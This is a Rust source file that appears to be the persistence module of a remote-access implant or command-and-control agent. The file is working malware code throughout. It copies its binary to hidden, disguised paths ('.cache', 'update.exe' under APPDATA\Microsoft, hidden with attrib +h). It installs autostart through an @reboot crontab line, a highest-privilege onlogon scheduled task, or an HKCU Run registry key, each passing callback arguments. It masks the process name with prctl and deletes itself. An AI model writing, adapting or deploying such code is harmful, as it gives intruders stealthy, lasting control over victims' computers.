use std::path::{Path, PathBuf};
use tracing::{info, warn};

pub struct PersistConfig {
    pub install_path: Option<String>,
    pub process_name: Option<String>,
    pub cron: bool,
    #[allow(dead_code)]
    pub task_name: String,
    pub registry: bool,
}

pub fn install(config: &PersistConfig, callback_args: &[String]) {
    if let Some(ref name) = config.process_name {
        masquerade_process_name(name);
    }

    if let Some(ref path) = config.install_path {
        if let Some(installed) = copy_to_hidden(path) {
            info!("installed to {}", installed.display());
            install_persistence(&installed, callback_args, config);
        }
    } else if (config.cron || config.registry)
        && let Ok(exe) = std::env::current_exe()
    {
        install_persistence(&exe, callback_args, config);
    }
}

fn install_persistence(exe_path: &Path, callback_args: &[String], config: &PersistConfig) {
    #[cfg(unix)]
    if config.cron {
        install_cron(exe_path, callback_args);
    }

    #[cfg(windows)]
    {
        if config.registry {
            install_registry_run(exe_path, callback_args, &config.task_name);
        } else if config.cron {
            install_schtask(exe_path, callback_args, &config.task_name);
        }
    }

    #[cfg(not(any(unix, windows)))]
    {
        let _ = (exe_path, callback_args, config);
    }
}

fn copy_to_hidden(target_dir: &str) -> Option<PathBuf> {
    let exe = std::env::current_exe().ok()?;

    #[cfg(unix)]
    let dest = Path::new(target_dir).join(".cache");

    #[cfg(windows)]
    let dest = {
        let dir = if target_dir.is_empty() {
            default_windows_install_dir()
        } else {
            PathBuf::from(target_dir)
        };
        dir.join("update.exe")
    };

    #[cfg(not(any(unix, windows)))]
    let dest = Path::new(target_dir).join(".cache");

    if dest == exe {
        return Some(dest);
    }

    if let Some(parent) = dest.parent() {
        let _ = std::fs::create_dir_all(parent);
    }

    match std::fs::copy(&exe, &dest) {
        Ok(_) => {
            #[cfg(unix)]
            {
                use std::os::unix::fs::PermissionsExt;
                let _ = std::fs::set_permissions(&dest, std::fs::Permissions::from_mode(0o755));
            }
            #[cfg(windows)]
            {
                // Hide the file with attrib +h
                let _ = std::process::Command::new("attrib")
                    .args(["+h", &dest.to_string_lossy()])
                    .output();
            }
            Some(dest)
        }
        Err(e) => {
            warn!("failed to install to {}: {e}", dest.display());
            None
        }
    }
}

#[cfg(windows)]
fn default_windows_install_dir() -> PathBuf {
    if let Ok(appdata) = std::env::var("APPDATA") {
        PathBuf::from(appdata).join("Microsoft")
    } else {
        PathBuf::from(r"C:\ProgramData\Microsoft")
    }
}

// --- Linux persistence: cron ------------------------------------------------

#[cfg(unix)]
fn install_cron(exe_path: &Path, callback_args: &[String]) {
    let exe_str = exe_path.to_string_lossy();
    let args_str = callback_args.join(" ");
    let cron_line = format!("@reboot {exe_str} {args_str} >/dev/null 2>&1 &");

    let existing = std::process::Command::new("crontab")
        .arg("-l")
        .output()
        .map(|o| String::from_utf8_lossy(&o.stdout).to_string())
        .unwrap_or_default();

    if existing.contains(&*exe_str) {
        info!("cron entry already exists");
        return;
    }

    let new_crontab = if existing.trim().is_empty() {
        cron_line
    } else {
        format!("{}\n{}", existing.trim(), cron_line)
    };

    let mut child = match std::process::Command::new("crontab")
        .arg("-")
        .stdin(std::process::Stdio::piped())
        .spawn()
    {
        Ok(c) => c,
        Err(e) => {
            warn!("failed to install cron: {e}");
            return;
        }
    };

    if let Some(mut stdin) = child.stdin.take() {
        use std::io::Write;
        let _ = stdin.write_all(new_crontab.as_bytes());
    }

    match child.wait() {
        Ok(status) if status.success() => info!("cron entry installed"),
        Ok(status) => warn!("crontab exited with {status}"),
        Err(e) => warn!("crontab failed: {e}"),
    }
}

// --- Windows persistence: scheduled task ------------------------------------

#[cfg(windows)]
fn install_schtask(exe_path: &Path, callback_args: &[String], task_name: &str) {
    let exe_str = exe_path.to_string_lossy();

    // Check if task already exists
    let check = std::process::Command::new("schtasks")
        .args(["/query", "/tn", task_name])
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .status();

    if let Ok(status) = check {
        if status.success() {
            info!("scheduled task '{task_name}' already exists");
            return;
        }
    }

    let args_str = callback_args.join(" ");
    let tr = format!("{exe_str} {args_str}");

    let result = std::process::Command::new("schtasks")
        .args([
            "/create", "/tn", task_name, "/tr", &tr, "/sc", "onlogon", "/rl", "highest", "/f",
        ])
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .status();

    match result {
        Ok(status) if status.success() => info!("scheduled task '{task_name}' created"),
        Ok(status) => warn!("schtasks exited with {status}"),
        Err(e) => warn!("schtasks failed: {e}"),
    }
}

// --- Windows persistence: registry Run key ----------------------------------

#[cfg(windows)]
fn install_registry_run(exe_path: &Path, callback_args: &[String], value_name: &str) {
    let exe_str = exe_path.to_string_lossy();
    let args_str = callback_args.join(" ");
    let data = format!("{exe_str} {args_str}");

    let result = std::process::Command::new("reg")
        .args([
            "add",
            r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
            "/v",
            value_name,
            "/t",
            "REG_SZ",
            "/d",
            &data,
            "/f",
        ])
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .status();

    match result {
        Ok(status) if status.success() => info!("registry Run key '{value_name}' set"),
        Ok(status) => warn!("reg add exited with {status}"),
        Err(e) => warn!("reg add failed: {e}"),
    }
}

// --- Process name masquerade ------------------------------------------------

fn masquerade_process_name(name: &str) {
    #[cfg(target_os = "linux")]
    {
        let c_name = std::ffi::CString::new(name).unwrap_or_default();
        unsafe {
            libc::prctl(libc::PR_SET_NAME, c_name.as_ptr(), 0, 0, 0);
        }
        if let Ok(mut f) = std::fs::OpenOptions::new()
            .write(true)
            .open("/proc/self/comm")
        {
            use std::io::Write;
            let _ = f.write_all(name.as_bytes());
        }
    }

    #[cfg(windows)]
    {
        // On Windows, masquerade is handled by copy_to_hidden using the
        // provided name as the destination filename
        let _ = name;
    }

    #[cfg(not(any(target_os = "linux", windows)))]
    {
        let _ = name;
    }
}

// --- Self-delete ------------------------------------------------------------

pub fn self_delete() {
    #[cfg(unix)]
    {
        if let Ok(exe) = std::env::current_exe() {
            let _ = std::fs::remove_file(exe);
        }
    }

    #[cfg(windows)]
    {
        if let Ok(exe) = std::env::current_exe() {
            let exe_str = exe.to_string_lossy().to_string();
            // Spawn a detached cmd that waits then deletes the binary
            let _ = std::process::Command::new("cmd")
                .args([
                    "/c",
                    &format!("ping localhost -n 2 > nul & del \"{exe_str}\""),
                ])
                .stdout(std::process::Stdio::null())
                .stderr(std::process::Stdio::null())
                .spawn();
        }
    }

    #[cfg(not(any(unix, windows)))]
    {}
}
